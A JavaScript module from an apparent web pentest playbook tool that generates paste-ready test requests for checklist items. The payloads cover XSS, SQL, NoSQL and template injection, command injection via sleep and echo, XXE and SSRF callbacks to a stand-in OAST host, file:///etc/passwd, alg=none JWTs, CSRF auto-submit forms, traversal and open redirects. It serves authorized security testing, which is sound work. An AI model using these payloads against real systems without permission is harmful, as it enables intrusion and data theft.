// Concrete request/command/html variants for any checklist item.
// Authored playbook overlays win; everything else is synthesized from
// category + title so a page playbook can list ALL applicable checks
// with something you can paste into Repeater — not methodology prose.

function req(method, target, headers = {}, body = '') {
  const lines = [`${method} ${target} HTTP/1.1`];
  if (!Object.keys(headers).some((name) => name.toLowerCase() === 'host')) lines.push('Host: www.example.com');
  for (const [name, value] of Object.entries(headers)) lines.push(`${name}: ${value}`);
  if (body) {
    if (!Object.keys(headers).some((name) => name.toLowerCase() === 'content-length')) {
      lines.push(`Content-Length: ${body.length}`);
    }
    return `${lines.join('\n')}\n\n${body}`;
  }
  if (!Object.keys(headers).some((name) => name.toLowerCase() === 'connection')) lines.push('Connection: close');
  return lines.join('\n');
}

function V(name, kind, payload, expect) {
  return { name, kind, payload, expect };
}

const GET = (path, headers) => req('GET', path, headers);
const POST = (path, headers, body) => req('POST', path, headers, body);

function haystack(item) {
  return `${item.id} ${item.title} ${item.objective || ''} ${(item.tags || []).join(' ')}`.toLowerCase();
}

function has(text, ...needles) {
  return needles.some((needle) => text.includes(needle));
}

function surfacePath(item, path = '/') {
  const text = haystack(item);
  if (has(text, 'login', 'credential', 'password guessing')) return '/login';
  if (has(text, 'register', 'signup', 'registration')) return '/register';
  if (has(text, 'reset', 'forgot', 'recovery')) return '/forgot-password';
  if (has(text, 'upload', 'filename', 'archive')) return '/upload';
  if (has(text, 'search', 'filter', 'report')) return '/search';
  if (has(text, 'checkout', 'payment', 'coupon', 'cart', 'price')) return '/checkout';
  if (has(text, 'admin', 'privileged', 'impersonat')) return '/admin';
  if (has(text, 'graphql')) return '/graphql';
  if (has(text, 'websocket', 'socket')) return '/chat';
  if (has(text, 'api', 'bearer', 'object authorization', 'mass assignment')) return '/api/v1/resource/1001';
  if (path) return path;
  return '/';
}

function synthesize(item, path = '/') {
  const text = haystack(item);
  const here = surfacePath(item, path);
  const matched = [];

  if (has(text, 'tls', 'certificate', 'testssl', 'https')) {
    matched.push(
      V('Fast testssl', 'command', 'testssl.sh --fast --sneaky https://www.example.com', 'SSLv2/3, TLS 1.0/1.1, export/NULL/RC4, expired or hostname-mismatched cert.'),
      V('openssl handshake', 'command', 'echo | openssl s_client -connect www.example.com:443 -servername www.example.com -tls1_0 2>/dev/null | openssl x509 -noout -dates -subject', 'TLS 1.0 succeeds (bad) or is refused (good). Repeat with -tls1_1 / -tls1_2.')
    );
  }
  if (has(text, 'hsts', 'strict-transport')) {
    matched.push(
      V('Read HSTS', 'request', GET('/'), 'Strict-Transport-Security: max-age≥15552000; includeSubDomains. Missing or short max-age is the lead.'),
      V('HSTS on HTTP', 'request', GET('/'), 'An HSTS header on plaintext is ignored. Confirm it is only set on HTTPS.')
    );
  }
  if (has(text, 'csp', 'content-security-policy', 'nonce', 'unsafe-inline')) {
    matched.push(
      V('Read enforced CSP', 'request', GET(here), 'Content-Security-Policy (enforced) vs Report-Only. script-src with unsafe-inline / https: / * does not constrain script.'),
      V('Weak policy shape', 'note', "Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https: data: *", 'This policy is not protection. object-src should be none; base-uri and form-action should be set.')
    );
  }
  if (has(text, 'frame', 'clickjack', 'x-frame', 'ancestors')) {
    matched.push(
      V('Read framing headers', 'request', GET(here), "frame-ancestors 'none' (or an allowlist). X-Frame-Options: DENY or SAMEORIGIN must not contradict CSP."),
      V('Cross-origin iframe', 'html', `<!doctype html>\n<iframe src="https://www.example.com${here}" style="width:100%;height:100%"></iframe>`, 'Iframe stays blank when framing is denied. If the page renders, framing is allowed.')
    );
  }
  if (has(text, 'nosniff', 'mime sniff', 'content-type-options', 'content-type')) {
    matched.push(
      V('Read Content-Type + nosniff', 'request', GET(here), 'Accurate Content-Type and X-Content-Type-Options: nosniff on HTML and any user-influenced body.'),
      V('Error vs asset', 'request', GET('/this-path-should-404'), 'Error and static-asset responses often drop nosniff that the homepage has.')
    );
  }
  if (has(text, 'referrer-policy', 'referrer')) {
    matched.push(
      V('Read Referrer-Policy', 'request', GET(here), 'strict-origin-when-cross-origin or stricter. unsafe-url leaks tokens.'),
      V('Token in query then leave', 'note', 'Open a URL with ?token=wapt on this origin, click a third-party resource, inspect Referer.', 'The token must not appear in Referer.')
    );
  }
  if (has(text, 'cache-control', 'caching', 'no-store', 'bfcache')) {
    matched.push(
      V('Read Cache-Control', 'request', GET(here), 'Authenticated or personalized HTML must be private / no-store. Public marketing HTML may be public.'),
      V('Replay after logout', 'request', GET(here, { Cookie: 'session=expired-or-logged-out' }), 'A cached authenticated body after logout is the finding.')
    );
  }
  if (has(text, 'cors', 'origin', 'acao', 'access-control')) {
    matched.push(
      V('Reflected Origin', 'request', GET(here, { Origin: 'https://evil.example' }), 'ACAO: https://evil.example + credentials is a finding if the body is non-public.'),
      V('null / suffix origin', 'request', GET(here, { Origin: 'https://www.example.com.evil.example' }), 'Substring allowlists fail this way. Also try Origin: null.')
    );
  }
  if (has(text, 'host header', 'host and', 'authority', 'forwarded', 'x-forwarded', 'virtual host')) {
    matched.push(
      V('Arbitrary Host', 'request', GET(here, { Host: 'evil.example' }), '400/421/404, or the canonical site. Vulnerable if Location or generated links use evil.example.'),
      V('X-Forwarded-Host', 'request', GET(here, { Host: 'www.example.com', 'X-Forwarded-Host': 'evil.example' }), 'Ignored unless a trusted hop overwrites it. Vulnerable if links use evil.example.'),
      V('Duplicate Host', 'request', 'GET ' + here + ' HTTP/1.1\nHost: www.example.com\nHost: evil.example\nConnection: close', 'Reject, or use one value at every hop. Vulnerable if edge and app disagree.')
    );
  }
  if (has(text, 'redirect', 'absolute-form', 'destination', 'open-redirect', 'return url')) {
    matched.push(
      V('Absolute HTTPS', 'request', GET(`${here.includes('?') ? here + '&' : here + '?'}next=https://evil.example/`), 'No 3xx to evil.example. Repeat for next, url, redirect, return, dest, continue.'),
      V('Protocol-relative', 'request', GET(`${here.includes('?') ? here + '&' : here + '?'}next=//evil.example/`), 'Rejected or treated as a relative path. Vulnerable if Location becomes //evil.example/.')
    );
  }
  if (has(text, 'traversal', 'path segment', 'dot-dot', 'alias', 'normalize path', 'percent-encoded')) {
    matched.push(
      V('Dot-dot slash', 'request', GET('/assets/../../../wapt-canary.txt'), 'A canary you placed (not /etc/passwd) is returned. Stop after one confirmed read.'),
      V('URL-encoded separators', 'request', GET('/assets/..%2f..%2f..%2fwapt-canary.txt'), 'Same after one decode. Also try %2e%2e/ and double-encoded %252f.')
    );
  }
  if (has(text, 'directo', 'enumera', 'robots', 'sitemap', 'well-known', 'backup', 'version-control', '.git', 'env file', 'leftover')) {
    matched.push(
      V('robots / well-known', 'request', GET('/robots.txt'), 'Disallow entries are leads. Also /.well-known/security.txt and /sitemap.xml.'),
      V('Common leftovers', 'note', '/.git/HEAD\n/.env\n/.env.production\n/backup.zip\n/server-status\n/index.html.bak\n/package.json', 'Any 200 with real content is in-scope disclosure. Confirm the body.')
    );
  }
  if (has(text, 'list directory', 'listing', 'index of', 'bucket')) {
    matched.push(
      V('Trailing-slash directory', 'request', GET('/assets/'), 'Index of /assets or S3/GCS XML. Repeat /static/, /uploads/, /backup/.'),
      V('Object-storage listing', 'request', GET('/?prefix=&delimiter=/', { Host: 'files.example.com' }), 'S3-style ListBucketResult XML. Also ?list-type=2.')
    );
  }
  if (has(text, 'xss', 'script', 'dom', 'innerhtml', 'postmessage', 'svg')) {
    matched.push(
      V('HTML marker', 'request', GET(`${here.includes('?') ? here + '&' : here + '?'}q=%3Cimg%20src=x%20onerror=alert(1)%3E`), 'If the raw markup appears in HTML, refine until it executes in a real page load.'),
      V('Attribute breakout', 'request', GET(`${here.includes('?') ? here + '&' : here + '?'}q=%22%20onfocus=alert(1)%20autofocus=%22`), 'If the value lands in an attribute, a quote breakout executes.')
    );
  }
  if (has(text, 'sql')) {
    matched.push(
      V('Quote / syntax', 'request', GET(`${here.includes('?') ? here + '&' : here + '?'}q=%27`), 'A SQL error or a different 500 vs baseline is a lead. Follow with a boolean pair.'),
      V('Boolean pair', 'request', GET(`${here.includes('?') ? here + '&' : here + '?'}q=widget%27+AND+1%3D1--`), "Compare with AND 1=2. A stable differential is the finding. Do not dump tables.")
    );
  }
  if (has(text, 'nosql', 'mongodb', '$ne', '$gt')) {
    matched.push(
      V('JSON $ne', 'request', POST('/api/v1/search', { 'Content-Type': 'application/json', Authorization: 'Bearer <token>' }, '{"q":{"$ne":null}}'), 'Must be a literal string. Extra rows vs q="widget" is the finding.'),
      V('Bracket operators', 'request', GET('/search?q[$ne]=&status[$gt]='), 'qs parsers turn this into operators.')
    );
  }
  if (has(text, 'template', 'ssti', 'freemarker', 'twig', 'jinja', 'velocity')) {
    matched.push(
      V('Twig / Jinja arithmetic', 'request', GET(`${here.includes('?') ? here + '&' : here + '?'}q={{7*7}}`), 'Look for 49 where the query is echoed. Do not escalate to a shell.'),
      V('Other engines', 'request', GET(`${here.includes('?') ? here + '&' : here + '?'}q=%24%7B7*7%7D`), 'Same 49 check for ${7*7} and <%= 7*7 %>.')
    );
  }
  if (has(text, 'command injection', 'os argument', 'shell', 'blind command')) {
    matched.push(
      V('Separator + marker', 'request', GET(`${here.includes('?') ? here + '&' : here + '?'}q=widget%3Becho%20WAPT_MARK`), 'Look for WAPT_MARK in the body or timing. Use echo, never a reverse shell.'),
      V('Blind timing', 'note', 'q=widget`sleep 5`  and  q=widget$(sleep 5)', 'A consistent extra delay vs baseline is the finding. Keep the sleep short.')
    );
  }
  if (has(text, 'xxe', 'external entity', 'dtd')) {
    matched.push(
      V('External entity callback', 'note', '<?xml version="1.0"?>\n<!DOCTYPE wapt [ <!ENTITY xxe SYSTEM "https://unique.oast.example/xxe"> ]>\n<root>&xxe;</root>', 'An outbound hit on your listener is the finding. Do not harvest /etc/passwd on production.'),
      V('Parameter entity', 'note', '<?xml version="1.0"?>\n<!DOCTYPE wapt [ <!ENTITY % dtd SYSTEM "https://unique.oast.example/xxe.dtd"> %dtd; ]>', 'Same listener check. External DTD loading should be off.')
    );
  }
  if (has(text, 'ssrf', 'url-fetch', 'webhook', 'outbound', 'collaborator', 'metadata')) {
    matched.push(
      V('Collaborator HTTPS', 'request', POST('/api/v1/hooks', { 'Content-Type': 'application/json', Authorization: 'Bearer <token>' }, '{"url":"https://unique.oast.example/wapt"}'), 'An outbound hit on your listener. Repeat for image, callback, avatar, import_url.'),
      V('Loopback / scheme', 'note', 'http://127.0.0.1/\nfile:///etc/passwd\nhttp://unique.oast.example@127.0.0.1/', 'Schemes outside http/https should be refused. Do not hit cloud metadata without owner approval.')
    );
  }
  if (has(text, 'jwt', 'alg', 'bearer', 'jku', 'kid')) {
    matched.push(
      V('alg=none', 'note', 'Authorization: Bearer <base64({"alg":"none","typ":"JWT"})>.<payload>.', 'Empty signature (trailing dot). Must 401. Also try None / NONE.'),
      V('Flip the signature', 'note', 'Take a valid access token, change the last signature character, replay /me.', 'Must 401. A 200 means signatures are not checked.')
    );
  }
  if (has(text, 'csrf', 'anti-csrf', 'same-site', 'cross-site request', 'login csrf')) {
    matched.push(
      V('Cross-site form', 'html', `<form action="https://www.example.com${here}" method="POST">\n  <input name="email" value="attacker@example.com">\n</form>\n<script>document.forms[0].submit()</script>`, 'Must fail without a valid CSRF token. Impact is a state change, not a 200.'),
      V('JSON as text/plain', 'request', POST(here === '/' ? '/api/v1/me' : here, { 'Content-Type': 'text/plain', Origin: 'https://evil.example', Cookie: 'session=<victim>' }, '{"email":"attacker@example.com"}'), 'A JSON handler that also parses text/plain is CSRF-simple.')
    );
  }
  if (has(text, 'cookie', 'httponly', 'secure flag', 'samesite', 'session token', 'set-cookie')) {
    matched.push(
      V('Read Set-Cookie', 'request', POST('/login', { 'Content-Type': 'application/x-www-form-urlencoded' }, 'username=tester&password=ChangeMe1!'), 'Session cookies need Secure, HttpOnly, and a SameSite that matches the real flow.'),
      V('document.cookie', 'note', 'In the logged-in origin console: document.cookie', 'The session name must be absent.')
    );
  }
  if (has(text, 'fixation', 'rotate session', 'pre-authentication')) {
    matched.push(
      V('Compare pre/post login', 'note', 'Note Set-Cookie on GET /login, submit credentials, compare name and value.', 'Value must change. A new name with the old value still counting is the same bug.'),
      V('Planted cookie', 'request', POST('/login', { 'Content-Type': 'application/x-www-form-urlencoded', Cookie: 'session=wapt-planted-value' }, 'username=tester&password=ChangeMe1!'), 'The planted value must not become the authenticated session.')
    );
  }
  if (has(text, 'logout', 'invalidate', 'revoke')) {
    matched.push(
      V('Replay after logout', 'note', 'Copy the session cookie, log out, send GET /api/v1/me with the old cookie.', 'Must 401. A 200 is the finding.'),
      V('Logout request', 'request', POST('/logout', { Cookie: 'session=<current>' }, ''), 'Server must drop the session. A client-only cookie delete is not enough.')
    );
  }
  if (has(text, 'enumerat', 'indistinguishable', 'account existence', 'username')) {
    matched.push(
      V('Known vs unknown', 'request', POST('/login', { 'Content-Type': 'application/x-www-form-urlencoded' }, 'username=known.user%40example.com&password=wrong'), 'Compare with no.such.user@example.com. Diff status, Location, body length, timing.'),
      V('Reset / register', 'request', POST('/forgot-password', { 'Content-Type': 'application/x-www-form-urlencoded' }, 'email=known.user%40example.com'), 'Same comparison on forgot-password and /register.')
    );
  }
  if (has(text, 'lockout', 'rate-limit', 'stuffing', 'guessing', 'otp', 'throttl')) {
    matched.push(
      V('Bounded burst', 'note', 'Repeat the failing POST five to ten times against YOUR test account only.', 'Captcha, backoff, or 429. If nothing happens, record the count and stop.'),
      V('Per-account vs per-IP', 'note', 'Do not lock a real user. If the control is per-IP only, note the gap without spraying anyone else.', 'Per-account limits matter more than per-IP.')
    );
  }
  if (has(text, 'default credential', 'vendor default', 'bootstrap password', 'seeded')) {
    matched.push(
      V('Documented vendor pairs', 'note', 'admin / admin\nadmin / password\nadministrator / administrator', "Only the pairs this product documents. One try each, then stop."),
      V('Seeded demo users', 'note', 'demo / demo\nuser / user\ntest / test', 'A successful login on a leftover demo account is the finding.')
    );
  }
  if (has(text, 'object authorization', 'horizontal', 'idor', 'object-level', 'bola', 'swap the')) {
    matched.push(
      V('Swap the path id', 'request', GET('/api/v1/orders/1002', { Authorization: 'Bearer <account-A-token>' }), "1002 belongs to B. Repeat as PUT/PATCH/DELETE. A 200 for B's object is the finding."),
      V('Body id retarget', 'request', req('PATCH', '/api/v1/orders/1001', { Authorization: 'Bearer <account-A-token>', 'Content-Type': 'application/json' }, '{"id":1002,"status":"cancelled"}'), 'Body id must not retarget the update. Also try user_id, account_id, tenant_id.')
    );
  }
  if (has(text, 'function authorization', 'administrative', 'low-privilege', 'bfla', 'hidden ui')) {
    matched.push(
      V('Member on an admin route', 'request', GET('/api/v1/admin/users', { Authorization: 'Bearer <member-token>' }), '403/404, not a user list. Repeat /internal/, /debug/, /manage/.'),
      V('Verb swap', 'request', req('DELETE', '/api/v1/users/42', { Authorization: 'Bearer <member-token>' }), 'GET may be allowed and DELETE not. Also PUT, PATCH, X-HTTP-Method-Override.')
    );
  }
  if (has(text, 'mass assignment', 'writable schema', 'role and permission', 'client-controlled role', 'hidden privilege')) {
    matched.push(
      V('Hidden privilege fields', 'request', req('PATCH', '/api/v1/users/me', { Authorization: 'Bearer <member-token>', 'Content-Type': 'application/json' }, '{"role":"admin","isAdmin":true,"verified":true}'), 'Read the object back. role/isAdmin/verified must be unchanged.'),
      V('Nested wrapper', 'request', req('PATCH', '/api/v1/users/me', { Authorization: 'Bearer <member-token>', 'Content-Type': 'application/json' }, '{"user":{"role":"admin"},"role":"admin"}'), 'Some binders take the nested object, some the top-level key.')
    );
  }
  if (has(text, 'missing', 'malformed', 'alternate', 'no token', 'unauthenticated')) {
    matched.push(
      V('Drop Authorization', 'request', GET(here.startsWith('/api') ? here : '/api/v1/me'), '401, not 200 with data. Repeat on every interesting route.'),
      V('Token in the query', 'request', GET('/api/v1/me?access_token=<token>'), 'If it works, the token is now in logs and Referer.')
    );
  }
  if (has(text, 'upload', 'filename', 'extension', 'svg', 'polyglot', 'content-disposition')) {
    matched.push(
      V('GIF magic, HTML name', 'note', 'Filename: note.html\nContent-Type: image/gif\nBody: GIF89a\\n<script>alert(1)</script>', 'If stored and served as HTML from the app origin, that is stored XSS.'),
      V('Traversal filename', 'note', 'filename: ../../wapt-canary.txt\nfilename: note.php.jpg', 'Must stay inside the upload root and not become executable.')
    );
  }
  if (has(text, 'price', 'quantity', 'coupon', 'currency', 'checkout', 'payment amount')) {
    matched.push(
      V('Client-supplied price', 'request', POST('/cart/items', { 'Content-Type': 'application/json', Cookie: 'session=<account-A>' }, '{"sku":"SKU-1","qty":1,"price":0.01}'), 'The charged amount must be recomputed from the catalog, not this body.'),
      V('Negative qty / zero total', 'request', POST('/checkout', { 'Content-Type': 'application/json', Cookie: 'session=<account-A>' }, '{"total":0,"qty":-1}'), 'Must refuse. A fulfilled order at 0 is the finding.')
    );
  }
  if (has(text, 'oauth', 'redirect_uri', 'pkce', 'authorization code', 'relaystate', 'saml')) {
    matched.push(
      V('Prefix redirect_uri', 'request', GET('/authorize?client_id=<id>&redirect_uri=https://app.example.com.evil.example/&response_type=code&state=wapt', { Host: 'idp.example.com' }), 'Must reject. A code landing on an origin you control is the finding.'),
      V('Drop state / wrong PKCE', 'note', 'Complete the callback without state, and exchange a code with code_verifier=wrong.', 'Both must fail.')
    );
  }
  if (has(text, 'websocket', 'wss', 'socket origin')) {
    matched.push(
      V('Arbitrary Origin upgrade', 'request', 'GET /chat HTTP/1.1\nHost: www.example.com\nOrigin: https://evil.example\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nCookie: session=<account-A>', 'Must reject. A 101 on an authenticated socket is the finding.'),
      V('No cookie', 'request', 'GET /chat HTTP/1.1\nHost: www.example.com\nOrigin: https://www.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13', 'Must 401. If 101, a privileged subscribe next is the finding.')
    );
  }
  if (has(text, 'graphql', 'introspection', '__schema', 'node(id')) {
    matched.push(
      V('Introspection', 'request', POST('/graphql', { 'Content-Type': 'application/json' }, '{"query":"{__schema{types{name fields{name}}}}"}'), 'Disabled in production, or limited to an allowlisted consumer.'),
      V('node(id:) swap', 'request', POST('/graphql', { 'Content-Type': 'application/json', Authorization: 'Bearer <account-A-token>' }, '{"query":"{node(id:\\"T3JkZXI6MTAwMg==\\"){... on Order{id total}}}"}'), "Order 1002 is B's. A 200 with B's data is the finding.")
    );
  }
  if (has(text, 'smuggl', 'desync', 'cl.te', 'te.cl', 'h2.cl', 'framing')) {
    matched.push(
      V('Map the hops first', 'note', 'Identify CDN / proxy / origin and get a desync-safe plan before sending CL.TE or TE.CL probes.', 'Do not poison another user. Isolated host or owner-approved window only.'),
      V('Well-formed control', 'request', GET(here), 'A clean request establishes the baseline framing. Any desync probe comes after that, on a dedicated connection.')
    );
  }
  if (has(text, 'source map', 'javascript bundle', 'secret', 'client-delivered')) {
    matched.push(
      V('Grep first-party JS', 'note', 'api[_-]?key|secret|password|token|AKIA[0-9A-Z]{16}|sk_live_|ghp_', 'Confirm any hit is a live credential, not a public site key.'),
      V('Source map', 'request', GET('/assets/app.js.map'), 'A map with sourcesContent is a lead. Embedded secrets or internal URLs are the finding.')
    );
  }

  if (matched.length >= 2) return dedupe(matched).slice(0, 6);

  return categoryFallback(item, here);
}

function categoryFallback(item, here) {
  const category = item.category;
  if (category === 'security-headers' || category === 'http') {
    return [
      V('Capture the live response', 'request', GET(here), `Record status, Location, Set-Cookie, and the policy headers that ${item.title.toLowerCase()} cares about.`),
      V('HTML vs error vs asset', 'request', GET('/this-path-should-404'), 'Error and static-asset responses often drop controls the homepage has. Compare /, /404, and a .js URL.')
    ];
  }
  if (category === 'reconnaissance' || category === 'information-disclosure') {
    return [
      V('Fetch the obvious path', 'request', GET(here), 'Confirm the body, not only the status. A 403 is a lead, not a finding.'),
      V('Sibling leftovers', 'note', '/robots.txt\n/sitemap.xml\n/.well-known/security.txt\n/.git/HEAD\n/.env\n/server-status', 'Any 200 with real non-public content is in-scope disclosure.')
    ];
  }
  if (category === 'authentication' || category === 'session-management') {
    return [
      V('Login POST', 'request', POST('/login', { 'Content-Type': 'application/x-www-form-urlencoded' }, 'username=tester&password=ChangeMe1!'), `Watch status, Set-Cookie, and Location against what “${item.title}” requires.`),
      V('Known-bad sibling', 'request', POST('/login', { 'Content-Type': 'application/x-www-form-urlencoded' }, 'username=tester&password=wrong'), 'Compare with the successful login. Diff cookies, body, and timing.')
    ];
  }
  if (category === 'authorization' || category === 'api-security') {
    return [
      V('As account A on B’s object', 'request', GET('/api/v1/resource/1002', { Authorization: 'Bearer <account-A-token>' }), '1002 belongs to B. A 200 with B’s data is the finding. Stop after a few hits.'),
      V('Drop the credential', 'request', GET('/api/v1/resource/1001'), '401, not a body. Repeat the interesting verb (GET/PUT/PATCH/DELETE).')
    ];
  }
  if (category === 'injection' || category === 'xss') {
    return [
      V('Inert marker in the input', 'request', GET(`${here.includes('?') ? here + '&' : here + '?'}q=wapt-marker-%27%22%3C%3E`), 'See where the marker lands (HTML, attribute, header, SQL error, JSON). Then pick syntax for that context.'),
      V('Paired probe', 'request', GET(`${here.includes('?') ? here + '&' : here + '?'}q=wapt%27+OR+%271%27%3D%271`), 'Compare with a closing-false sibling. A stable differential is the finding. Do not dump data.')
    ];
  }
  if (category === 'csrf') {
    return [
      V('Cross-site POST', 'html', `<form action="https://www.example.com${here}" method="POST">\n  <input name="action" value="wapt">\n</form>\n<script>document.forms[0].submit()</script>`, 'Must fail without a valid CSRF token. Impact is a state change.'),
      V('Simple-request JSON', 'request', POST(here, { 'Content-Type': 'text/plain', Origin: 'https://evil.example', Cookie: 'session=<victim>' }, '{"action":"wapt"}'), 'Must not change state.')
    ];
  }
  if (category === 'file-handling') {
    return [
      V('Benign marker file', 'note', 'Filename: wapt.txt\nContent-Type: text/plain\nBody: WAPT-UPLOAD-MARKER', 'Confirm store + download as this account before trying type confusion.'),
      V('Name / type confusion', 'note', 'wapt.html / image/gif / GIF89a\nwapt.php.jpg\n../../wapt-canary.txt', 'Must not execute, must not escape the upload root, must not be served as HTML on the app origin.')
    ];
  }
  if (category === 'jwt' || category === 'oauth-sso-saml') {
    return [
      V('Replay a captured token', 'note', 'Replay the access token after logout, after exp, and against a sibling API.', 'Must 401. A 200 on the wrong audience or after expiry is the finding.'),
      V('Mutate one claim / flag', 'note', 'Flip alg, aud, role, or redirect_uri — one change at a time — using only a test account.', 'The mutated token or redirect must be rejected.')
    ];
  }
  if (category === 'graphql') {
    return [
      V('Introspection', 'request', POST('/graphql', { 'Content-Type': 'application/json' }, '{"query":"{__schema{types{name}}}"}'), 'Disabled in production or limited to an allowlisted consumer.'),
      V('Swap the node', 'request', POST('/graphql', { 'Content-Type': 'application/json', Authorization: 'Bearer <account-A-token>' }, '{"query":"{node(id:\\"T3JkZXI6MTAwMg==\\"){id}}"}'), "B's node must not come back for A.")
    ];
  }
  if (category === 'websocket') {
    return [
      V('Upgrade with cookie', 'request', 'GET /chat HTTP/1.1\nHost: www.example.com\nOrigin: https://www.example.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nCookie: session=<account-A>', '101 only with a current credential. Then authorize the first message.'),
      V('Cross-origin upgrade', 'request', 'GET /chat HTTP/1.1\nHost: www.example.com\nOrigin: https://evil.example\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nCookie: session=<account-A>', 'Must reject.')
    ];
  }
  if (category === 'ssrf' || category === 'cloud-storage') {
    return [
      V('Controlled callback', 'request', POST('/api/v1/import', { 'Content-Type': 'application/json', Authorization: 'Bearer <token>' }, '{"url":"https://unique.oast.example/wapt"}'), 'An outbound hit on your listener. Do not hit cloud metadata without approval.'),
      V('Public vs signed object', 'request', GET('/files/2002'), "A's session must not read B's object. Confirm the body.")
    ];
  }
  if (category === 'business-logic' || category === 'race-conditions' || category === 'rate-limiting') {
    return [
      V('Baseline allowed action', 'request', POST(here, { 'Content-Type': 'application/json', Cookie: 'session=<account-A>' }, '{"qty":1}'), `A single in-policy request establishes the control ${item.title.toLowerCase()} is about.`),
      V('One invariant broken', 'request', POST(here, { 'Content-Type': 'application/json', Cookie: 'session=<account-A>' }, '{"qty":-1,"price":0,"coupon":"B-UNIQUE-CODE"}'), 'Change one field. Two parallel copies of the same POST is the race variant — keep amounts tiny.')
    ];
  }
  if (category === 'client-side' || category === 'advanced' || category === 'ai-llm-security' || category === 'request-smuggling') {
    return [
      V('Baseline page / message', 'request', GET(here), `Capture the live response that ${item.title.toLowerCase()} talks about before mutating anything.`),
      V('One attacker-controlled input', 'note', item.manipulate || 'Change one URL, header, storage key, or message field at a time.', item.validation || 'A realistic viewer context must show the effect. Do not collect sensitive data.')
    ];
  }
  return [
    V('Baseline request', 'request', GET(here), item.validation || 'Record the live response before you mutate anything.'),
    V('One change', 'note', item.manipulate || 'Change one parameter, header, or path at a time.', 'A consistent difference vs the baseline is a lead. Confirm impact before reporting.')
  ];
}

function dedupe(variants) {
  const seen = new Set();
  const out = [];
  for (const variant of variants) {
    const key = `${variant.name}|${variant.payload}`;
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(variant);
  }
  return out;
}

export function variantsForItem(item, overlay, path = '/') {
  if (Array.isArray(overlay?.variants) && overlay.variants.length >= 2) return overlay.variants;
  return synthesize(item, path);
}

export function checkFromItem(item, overlay, path = '/') {
  const variants = variantsForItem(item, overlay, path);
  return {
    id: overlay?.id || item.id.toLowerCase(),
    title: overlay?.title || item.title,
    item: item.id,
    related: overlay?.related || [],
    severity: overlay?.severity || item.severity,
    tool: overlay?.tool,
    why: overlay?.why || item.objective,
    validate: overlay?.validate || item.validation,
    variants,
    authored: Boolean(overlay)
  };
}
